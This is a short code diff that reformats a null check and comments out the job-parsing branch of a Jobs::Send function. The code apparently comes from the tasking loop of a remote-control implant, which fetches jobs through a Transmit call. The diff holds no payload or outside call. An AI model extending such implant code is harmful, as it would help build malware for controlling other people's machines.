@@ -8,7 +8,7 @@ auto DECLFN Jobs::Create(
     JOBS*   NewJob = (JOBS*)hAlloc( sizeof( JOBS ) );
     PARSER* JobPsr = (PARSER*)hAlloc( sizeof( PARSER ) );
 
-    if ( !NewJob || !JobPsr ) {
+    if ( ! NewJob || ! JobPsr ) {
         if ( NewJob ) hFree( NewJob );
         if ( JobPsr ) hFree( JobPsr );
         return nullptr;
@@ -125,13 +125,13 @@ auto DECLFN Jobs::Send(
     
     Self->Pkg->Transmit( PostJobs, (PVOID*)&Data, &Lenght );
 
-    if ( Lenght < 4 ) {
-        hFree( Data );
-    } else {
-        PARSER* Parser = (PARSER*)hAlloc( sizeof( PARSER ) );
-        Self->Psr->New( Parser, Data, Lenght );        
-        this->Create( (CHAR*)Self->Psr->Pad( Parser, 36 ), Parser, TRUE );
-    }
+    // if ( Lenght < 4 ) {
+    //     hFree( Data );
+    // } else {
+    //     PARSER* Parser = (PARSER*)hAlloc( sizeof( PARSER ) );
+    //     Self->Psr->New( Parser, Data, Lenght );        
+    //     this->Create( (CHAR*)Self->Psr->Pad( Parser, 36 ), Parser, TRUE );
+    // }
 
     return;
 }
